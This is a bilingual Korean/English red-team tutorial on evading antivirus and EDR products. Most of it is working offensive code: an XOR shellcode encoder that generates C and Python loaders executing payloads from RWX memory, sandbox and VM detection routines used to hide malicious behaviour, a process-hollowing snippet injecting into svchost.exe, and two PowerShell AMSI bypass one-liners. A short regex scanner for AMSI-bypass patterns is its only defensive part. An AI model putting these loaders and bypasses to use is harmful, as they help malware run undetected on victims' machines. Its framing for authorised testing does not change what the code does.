> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# AV/EDR 우회 기법 — 인코딩·다형성·탐지 회피

## 0. 초보자를 위한 개념 이해

### AV와 EDR이란?

**AV(Anti-Virus):** 악성코드를 탐지하고 제거하는 기본 보안 소프트웨어
- 파일 서명(해시) 데이터베이스와 비교
- 정적 분석 위주

**EDR(Endpoint Detection and Response):** 더 발전된 엔드포인트 보안 솔루션
- 실시간 행동 모니터링
- 프로세스, 네트워크, 레지스트리 활동 감시
- AI/ML 기반 이상 탐지
- 침해 발생 시 대응(격리, 수집) 지원

```
AV vs EDR 비교:
  AV:  파일 = 악성 코드 = 경보
  EDR: 프로세스 A → 메모리 주입 → 프로세스 B → 외부 통신 = 공격 체인 탐지
```

### 왜 레드팀이 우회 기법을 공부하는가?

```
레드팀 목적:
  "우리 회사의 AV/EDR이 실제 공격을 막을 수 있는가?"
  → 실제 공격자와 같은 기법으로 테스트해야 현실적
  
  AV 우회 기법 = 방어팀이 탐지 규칙을 개선하는 근거
```

> ⚠️ 이 내용은 허가된 레드팀 작전, 보안 연구, CTF 목적으로만 사용하세요.

### 탐지와 우회의 군비 경쟁

```
AV/EDR 발전:
  1세대: 시그니처(해시) 탐지 → 우회: 파일 1비트만 바꿔도 우회
  2세대: 휴리스틱(의심 패턴) → 우회: 행동을 분산하거나 지연
  3세대: 행동 기반 + 샌드박스 → 우회: 샌드박스 환경 탐지 후 숨기
  4세대: ML/AI 기반 → 우회: 특징 벡터 조작, 적대적 예제
  현재:  다계층(Multi-layer) → 우회: 더 어려워짐
```

---

## 1. AV 탐지 메커니즘

| 탐지 방식 | 설명 | 우회 방법 |
|-----------|------|-----------|
| 시그니처 기반 | 알려진 바이트 패턴 매칭 | 인코딩·암호화·다형성 |
| 휴리스틱 | 의심 행동 패턴 탐지 | 행동 분산·지연 실행 |
| 동적 분석 | 샌드박스 실행 분석 | 샌드박스 탐지 후 분기 |
| 머신러닝 | ML 모델 기반 분류 | 특징 조작·적대적 예제 |
| 메모리 스캐닝 | 런타임 메모리 검사 | 메모리 암호화·인라인 패칭 |

---

## 2. 페이로드 인코딩 기법

### 2.1 기본 XOR 인코딩

```python
#!/usr/bin/env python3
"""페이로드 XOR 인코딩·디코딩 CLI."""

import argparse
import os
from pathlib import Path


def xor_encode(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def generate_xor_loader(encoded: bytes, key: bytes, language: str = "c") -> str:
    encoded_hex = ", ".join(f"0x{b:02x}" for b in encoded)
    key_hex = ", ".join(f"0x{b:02x}" for b in key)

    if language == "c":
        return f"""
#include <windows.h>
#include <string.h>

unsigned char payload[] = {{ {encoded_hex} }};
unsigned char key[] = {{ {key_hex} }};
const SIZE_T payload_len = {len(encoded)};
const SIZE_T key_len = {len(key)};

void decode_payload(unsigned char* data, SIZE_T data_len, const unsigned char* k, SIZE_T k_len) {{
    for (SIZE_T i = 0; i < data_len; i++) {{
        data[i] ^= k[i % k_len];
    }}
}}

int main() {{
    decode_payload(payload, payload_len, key, key_len);

    LPVOID exec_mem = VirtualAlloc(NULL, payload_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return 1;

    memcpy(exec_mem, payload, payload_len);

    HANDLE thread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}}
"""
    elif language == "python":
        return f"""
import ctypes
import os

PAYLOAD = bytes([{encoded_hex}])
KEY = bytes([{key_hex}])

def decode(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

shellcode = decode(PAYLOAD, KEY)
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(buf))
func()
"""
    return ""


def main() -> None:
    parser = argparse.ArgumentParser(description="페이로드 XOR 인코더")
    sub = parser.add_subparsers(dest="cmd", required=True)

    enc_p = sub.add_parser("encode", help="페이로드 인코딩")
    enc_p.add_argument("payload", type=Path, help="원본 페이로드 파일")
    enc_p.add_argument("-k", "--key", help="XOR 키 (미지정 시 랜덤)")
    enc_p.add_argument("-o", "--output", type=Path, help="출력 파일")
    enc_p.add_argument("--lang", choices=["c", "python"], default="c", help="로더 언어")

    dec_p = sub.add_parser("decode", help="페이로드 디코딩")
    dec_p.add_argument("payload", type=Path)
    dec_p.add_argument("-k", "--key", required=True)
    dec_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "encode":
            raw = args.payload.read_bytes()
            key_bytes = args.key.encode() if args.key else os.urandom(16)
            encoded = xor_encode(raw, key_bytes)

            loader = generate_xor_loader(encoded, key_bytes, args.lang)
            ext = ".c" if args.lang == "c" else ".py"
            out = args.output or args.payload.with_suffix(f"_loader{ext}")
            out.write_text(loader)
            print(f"[+] 인코딩 완료")
            print(f"  키: {key_bytes.hex()}")
            print(f"  원본: {len(raw)} bytes → 인코딩: {len(encoded)} bytes")
            print(f"  로더: {out}")

        case "decode":
            raw = args.payload.read_bytes()
            key_bytes = bytes.fromhex(args.key)
            decoded = xor_encode(raw, key_bytes)  # XOR은 대칭
            out = args.output or args.payload.with_suffix(".decoded.bin")
            out.write_bytes(decoded)
            print(f"[+] 디코딩 완료: {out}")


if __name__ == "__main__":
    main()
```

---

## 3. 샌드박스 탐지 기법

```python
#!/usr/bin/env python3
"""샌드박스 환경 탐지 — 실행 환경 분기."""

import ctypes
import os
import platform
import time
import winreg
from pathlib import Path


def check_username() -> bool:
    """샌드박스 공통 사용자명 탐지."""
    sandbox_users = {
        "sandbox", "malware", "maltest", "virus", "antivirus",
        "av", "john", "user", "analyst", "test",
    }
    current = os.getenv("USERNAME", "").lower()
    return current in sandbox_users


def check_cpu_count() -> bool:
    """가상화 환경은 보통 CPU 1~2개."""
    import multiprocessing
    return multiprocessing.cpu_count() <= 2


def check_ram_size() -> bool:
    """샌드박스는 보통 RAM 2GB 이하."""
    if platform.system() == "Windows":
        kernel32 = ctypes.windll.kernel32
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
        return mem_status.ullTotalPhys < 2 * 1024 ** 3  # 2GB 미만
    return False


def check_vm_artifacts() -> bool:
    """VM 아티팩트 탐지 (VMware/VirtualBox/Hyper-V)."""
    vm_indicators = [
        # VMware
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        # VirtualBox
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        # QEMU
        r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
    ]

    if platform.system() != "Windows":
        vm_files = ["/sys/class/dmi/id/product_name"]
        for f in vm_files:
            try:
                content = Path(f).read_text().lower()
                if any(v in content for v in ["virtualbox", "vmware", "qemu", "kvm"]):
                    return True
            except OSError:
                pass
        return False

    for key_path in vm_indicators:
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            return True
        except FileNotFoundError:
            pass
    return False


def check_timing() -> bool:
    """타이밍 공격 탐지 — 샌드박스는 시간 가속."""
    start = time.perf_counter()
    time.sleep(5)
    elapsed = time.perf_counter() - start
    return elapsed < 4.5  # 5초 슬립이 4.5초 미만이면 가속 의심


def check_recent_files() -> bool:
    """사용자 최근 파일 없으면 샌드박스 의심."""
    if platform.system() == "Windows":
        recent_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Recent"
        if recent_dir.exists():
            files = list(recent_dir.glob("*.lnk"))
            return len(files) < 5
    return False


def is_sandbox() -> tuple[bool, list[str]]:
    """샌드박스 탐지 결과 반환."""
    checks = {
        "username": check_username,
        "cpu_count": check_cpu_count,
        "ram_size": check_ram_size,
        "vm_artifacts": check_vm_artifacts,
        "recent_files": check_recent_files,
    }

    triggered: list[str] = []
    for name, check in checks.items():
        try:
            if check():
                triggered.append(name)
        except Exception:
            pass

    return len(triggered) >= 2, triggered
```

---

## 4. 프로세스 인젝션 기법

```c
// Process Hollowing — 정상 프로세스에 페이로드 삽입
#include <windows.h>
#include <tlhelp32.h>

// 1. 정상 프로세스 생성 (Suspended)
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NO_WINDOW,
    NULL, NULL, &si, &pi
);

// 2. 원본 엔트리포인트 언매핑
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
pNtUnmapViewOfSection NtUnmapViewOfSection =
    (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

// 3. 페이로드 메모리 할당 및 쓰기
LPVOID remote_mem = VirtualAllocEx(pi.hProcess, (LPVOID)preferred_base,
    payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote_mem, payload, payload_size, NULL);

// 4. 스레드 컨텍스트 수정 후 재개
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_INTEGER;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)entry_point;  // x64
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## 5. AMSI 우회

AMSI(Antimalware Scan Interface)는 PowerShell·VBA 등의 스크립트를 런타임에 스캔한다.

```powershell
# AMSI 우회 기법 1 — amsiInitFailed 플래그
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# AMSI 우회 기법 2 — 메모리 패칭 (amsi.dll)
$a = [System.Runtime.InteropServices.Marshal]
$b = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$c = $b.GetField('amsiSession','NonPublic,Static')
$c.SetValue($null, $null)
```

```python
#!/usr/bin/env python3
"""AMSI 우회 기법 탐지 — 정적 분석."""

import re
import argparse
from pathlib import Path


AMSI_BYPASS_PATTERNS = [
    (re.compile(r"amsiInitFailed", re.IGNORECASE), "amsiInitFailed 플래그 조작"),
    (re.compile(r"AmsiScanBuffer|AmsiScanString", re.IGNORECASE), "AMSI API 직접 참조"),
    (re.compile(r"amsi\.dll", re.IGNORECASE), "amsi.dll 직접 로드"),
    (re.compile(r"amsiSession", re.IGNORECASE), "amsiSession null 설정"),
    (re.compile(r"0xB8,?\s*0x57,?\s*0x00,?\s*0x07,?\s*0x80", re.IGNORECASE), "AMSI 패치 바이트"),
]


def scan_file(filepath: Path) -> list[tuple[int, str, str]]:
    findings = []
    try:
        lines = filepath.read_text(encoding="utf-8", errors="ignore").splitlines()
        for lineno, line in enumerate(lines, 1):
            for pattern, desc in AMSI_BYPASS_PATTERNS:
                if pattern.search(line):
                    findings.append((lineno, desc, line.strip()[:100]))
    except OSError:
        pass
    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="AMSI 우회 코드 탐지")
    parser.add_argument("path", type=Path, help="스캔할 파일 또는 디렉터리")
    args = parser.parse_args()

    files = list(args.path.rglob("*.ps1")) + list(args.path.rglob("*.py")) \
        if args.path.is_dir() else [args.path]

    total_findings = 0
    for f in files:
        findings = scan_file(f)
        if findings:
            print(f"\n[!] {f}")
            for lineno, desc, code in findings:
                print(f"  L{lineno}: {desc}")
                print(f"    {code}")
            total_findings += len(findings)

    print(f"\n총 {total_findings}개 AMSI 우회 시도 발견")


if __name__ == "__main__":
    main()
```

---

## 6. AV 우회 전략 요약

| 전략 | 기법 | 효과 |
|------|------|------|
| 시그니처 우회 | XOR/AES 암호화, 커스텀 인코더 | 정적 탐지 우회 |
| 행동 우회 | 지연 실행, 분산 실행, 합법적 프로세스 사용 | 휴리스틱 우회 |
| 샌드박스 우회 | 환경 탐지 후 분기 | 동적 분석 우회 |
| 메모리 우회 | 직접 시스템 콜, 무파일 실행 | EDR 우회 |
| AMSI 우회 | 런타임 패칭, 반사 로딩 | 스크립트 스캔 우회 |

---

<a name="english"></a>

# AV/EDR Evasion Techniques — Encoding, Polymorphism, Detection Evasion

## 1. AV Detection Mechanisms

| Detection Method   | Description                          | Bypass Method                              |
|--------------------|--------------------------------------|--------------------------------------------|
| Signature-based    | Known byte pattern matching          | Encoding, encryption, polymorphism         |
| Heuristic          | Suspicious behavior pattern detection| Behavior distribution, delayed execution   |
| Dynamic analysis   | Sandbox execution analysis           | Branch after sandbox detection             |
| Machine learning   | ML model-based classification        | Feature manipulation, adversarial examples |
| Memory scanning    | Runtime memory inspection            | Memory encryption, inline patching         |

---

## 2. Payload Encoding Techniques

### 2.1 Basic XOR Encoding

```python
#!/usr/bin/env python3
"""Payload XOR encoding/decoding CLI."""

import argparse
import os
from pathlib import Path


def xor_encode(data: bytes, key: bytes) -> bytes:
    key_len = len(key)
    return bytes(b ^ key[i % key_len] for i, b in enumerate(data))


def generate_xor_loader(encoded: bytes, key: bytes, language: str = "c") -> str:
    encoded_hex = ", ".join(f"0x{b:02x}" for b in encoded)
    key_hex = ", ".join(f"0x{b:02x}" for b in key)

    if language == "c":
        return f"""
#include <windows.h>
#include <string.h>

unsigned char payload[] = {{ {encoded_hex} }};
unsigned char key[] = {{ {key_hex} }};
const SIZE_T payload_len = {len(encoded)};
const SIZE_T key_len = {len(key)};

void decode_payload(unsigned char* data, SIZE_T data_len, const unsigned char* k, SIZE_T k_len) {{
    for (SIZE_T i = 0; i < data_len; i++) {{
        data[i] ^= k[i % k_len];
    }}
}}

int main() {{
    decode_payload(payload, payload_len, key, key_len);

    LPVOID exec_mem = VirtualAlloc(NULL, payload_len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!exec_mem) return 1;

    memcpy(exec_mem, payload, payload_len);

    HANDLE thread = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}}
"""
    elif language == "python":
        return f"""
import ctypes
import os

PAYLOAD = bytes([{encoded_hex}])
KEY = bytes([{key_hex}])

def decode(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

shellcode = decode(PAYLOAD, KEY)
buf = ctypes.create_string_buffer(shellcode, len(shellcode))
func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(buf))
func()
"""
    return ""


def main() -> None:
    parser = argparse.ArgumentParser(description="Payload XOR encoder")
    sub = parser.add_subparsers(dest="cmd", required=True)

    enc_p = sub.add_parser("encode", help="Encode payload")
    enc_p.add_argument("payload", type=Path, help="Original payload file")
    enc_p.add_argument("-k", "--key", help="XOR key (random if not specified)")
    enc_p.add_argument("-o", "--output", type=Path, help="Output file")
    enc_p.add_argument("--lang", choices=["c", "python"], default="c", help="Loader language")

    dec_p = sub.add_parser("decode", help="Decode payload")
    dec_p.add_argument("payload", type=Path)
    dec_p.add_argument("-k", "--key", required=True)
    dec_p.add_argument("-o", "--output", type=Path)

    args = parser.parse_args()

    match args.cmd:
        case "encode":
            raw = args.payload.read_bytes()
            key_bytes = args.key.encode() if args.key else os.urandom(16)
            encoded = xor_encode(raw, key_bytes)

            loader = generate_xor_loader(encoded, key_bytes, args.lang)
            ext = ".c" if args.lang == "c" else ".py"
            out = args.output or args.payload.with_suffix(f"_loader{ext}")
            out.write_text(loader)
            print(f"[+] Encoding complete")
            print(f"  Key: {key_bytes.hex()}")
            print(f"  Original: {len(raw)} bytes → Encoded: {len(encoded)} bytes")
            print(f"  Loader: {out}")

        case "decode":
            raw = args.payload.read_bytes()
            key_bytes = bytes.fromhex(args.key)
            decoded = xor_encode(raw, key_bytes)  # XOR is symmetric
            out = args.output or args.payload.with_suffix(".decoded.bin")
            out.write_bytes(decoded)
            print(f"[+] Decoding complete: {out}")


if __name__ == "__main__":
    main()
```

---

## 3. Sandbox Detection Techniques

```python
#!/usr/bin/env python3
"""Sandbox environment detection — branch based on execution environment."""

import ctypes
import os
import platform
import time
import winreg
from pathlib import Path


def check_username() -> bool:
    """Detect common sandbox usernames."""
    sandbox_users = {
        "sandbox", "malware", "maltest", "virus", "antivirus",
        "av", "john", "user", "analyst", "test",
    }
    current = os.getenv("USERNAME", "").lower()
    return current in sandbox_users


def check_cpu_count() -> bool:
    """Virtualized environments usually have 1-2 CPUs."""
    import multiprocessing
    return multiprocessing.cpu_count() <= 2


def check_ram_size() -> bool:
    """Sandboxes usually have less than 2GB RAM."""
    if platform.system() == "Windows":
        kernel32 = ctypes.windll.kernel32
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", ctypes.c_ulong),
                ("dwMemoryLoad", ctypes.c_ulong),
                ("ullTotalPhys", ctypes.c_ulonglong),
                ("ullAvailPhys", ctypes.c_ulonglong),
                ("ullTotalPageFile", ctypes.c_ulonglong),
                ("ullAvailPageFile", ctypes.c_ulonglong),
                ("ullTotalVirtual", ctypes.c_ulonglong),
                ("ullAvailVirtual", ctypes.c_ulonglong),
                ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
            ]
        mem_status = MEMORYSTATUSEX()
        mem_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(ctypes.byref(mem_status))
        return mem_status.ullTotalPhys < 2 * 1024 ** 3  # Less than 2GB
    return False


def check_vm_artifacts() -> bool:
    """Detect VM artifacts (VMware/VirtualBox/Hyper-V)."""
    vm_indicators = [
        # VMware
        r"SOFTWARE\VMware, Inc.\VMware Tools",
        # VirtualBox
        r"SOFTWARE\Oracle\VirtualBox Guest Additions",
        # QEMU
        r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
    ]

    if platform.system() != "Windows":
        vm_files = ["/sys/class/dmi/id/product_name"]
        for f in vm_files:
            try:
                content = Path(f).read_text().lower()
                if any(v in content for v in ["virtualbox", "vmware", "qemu", "kvm"]):
                    return True
            except OSError:
                pass
        return False

    for key_path in vm_indicators:
        try:
            winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
            return True
        except FileNotFoundError:
            pass
    return False


def check_timing() -> bool:
    """Timing attack detection — sandboxes accelerate time."""
    start = time.perf_counter()
    time.sleep(5)
    elapsed = time.perf_counter() - start
    return elapsed < 4.5  # Suspected acceleration if 5s sleep completes in less than 4.5s


def check_recent_files() -> bool:
    """Suspected sandbox if no recent user files exist."""
    if platform.system() == "Windows":
        recent_dir = Path(os.environ.get("APPDATA", "")) / "Microsoft" / "Windows" / "Recent"
        if recent_dir.exists():
            files = list(recent_dir.glob("*.lnk"))
            return len(files) < 5
    return False


def is_sandbox() -> tuple[bool, list[str]]:
    """Return sandbox detection results."""
    checks = {
        "username": check_username,
        "cpu_count": check_cpu_count,
        "ram_size": check_ram_size,
        "vm_artifacts": check_vm_artifacts,
        "recent_files": check_recent_files,
    }

    triggered: list[str] = []
    for name, check in checks.items():
        try:
            if check():
                triggered.append(name)
        except Exception:
            pass

    return len(triggered) >= 2, triggered
```

---

## 4. Process Injection Techniques

```c
// Process Hollowing — inject payload into a legitimate process
#include <windows.h>
#include <tlhelp32.h>

// 1. Create legitimate process (Suspended)
STARTUPINFOA si = {0};
PROCESS_INFORMATION pi = {0};
si.cb = sizeof(si);

CreateProcessA(
    "C:\\Windows\\System32\\svchost.exe",
    NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED | CREATE_NO_WINDOW,
    NULL, NULL, &si, &pi
);

// 2. Unmap original entry point
HMODULE ntdll = GetModuleHandleA("ntdll.dll");
typedef NTSTATUS(WINAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
pNtUnmapViewOfSection NtUnmapViewOfSection =
    (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");

// 3. Allocate memory and write payload
LPVOID remote_mem = VirtualAllocEx(pi.hProcess, (LPVOID)preferred_base,
    payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remote_mem, payload, payload_size, NULL);

// 4. Modify thread context and resume
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_INTEGER;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)entry_point;  // x64
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## 5. AMSI Bypass

AMSI (Antimalware Scan Interface) scans scripts such as PowerShell and VBA at runtime.

```powershell
# AMSI bypass technique 1 — amsiInitFailed flag
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# AMSI bypass technique 2 — memory patching (amsi.dll)
$a = [System.Runtime.InteropServices.Marshal]
$b = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$c = $b.GetField('amsiSession','NonPublic,Static')
$c.SetValue($null, $null)
```

```python
#!/usr/bin/env python3
"""AMSI bypass technique detection — static analysis."""

import re
import argparse
from pathlib import Path


AMSI_BYPASS_PATTERNS = [
    (re.compile(r"amsiInitFailed", re.IGNORECASE), "amsiInitFailed flag manipulation"),
    (re.compile(r"AmsiScanBuffer|AmsiScanString", re.IGNORECASE), "Direct AMSI API reference"),
    (re.compile(r"amsi\.dll", re.IGNORECASE), "Direct amsi.dll load"),
    (re.compile(r"amsiSession", re.IGNORECASE), "amsiSession set to null"),
    (re.compile(r"0xB8,?\s*0x57,?\s*0x00,?\s*0x07,?\s*0x80", re.IGNORECASE), "AMSI patch bytes"),
]


def scan_file(filepath: Path) -> list[tuple[int, str, str]]:
    findings = []
    try:
        lines = filepath.read_text(encoding="utf-8", errors="ignore").splitlines()
        for lineno, line in enumerate(lines, 1):
            for pattern, desc in AMSI_BYPASS_PATTERNS:
                if pattern.search(line):
                    findings.append((lineno, desc, line.strip()[:100]))
    except OSError:
        pass
    return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="AMSI bypass code detection")
    parser.add_argument("path", type=Path, help="File or directory to scan")
    args = parser.parse_args()

    files = list(args.path.rglob("*.ps1")) + list(args.path.rglob("*.py")) \
        if args.path.is_dir() else [args.path]

    total_findings = 0
    for f in files:
        findings = scan_file(f)
        if findings:
            print(f"\n[!] {f}")
            for lineno, desc, code in findings:
                print(f"  L{lineno}: {desc}")
                print(f"    {code}")
            total_findings += len(findings)

    print(f"\nTotal {total_findings} AMSI bypass attempts found")


if __name__ == "__main__":
    main()
```

---

## 6. AV Evasion Strategy Summary

| Strategy           | Technique                                          | Effect                        |
|--------------------|----------------------------------------------------|-------------------------------|
| Signature bypass   | XOR/AES encryption, custom encoder                 | Bypass static detection       |
| Behavioral bypass  | Delayed execution, distributed execution, use legitimate processes | Bypass heuristics |
| Sandbox bypass     | Detect environment then branch                     | Bypass dynamic analysis       |
| Memory bypass      | Direct syscalls, fileless execution                | Bypass EDR                    |
| AMSI bypass        | Runtime patching, reflective loading               | Bypass script scanning        |
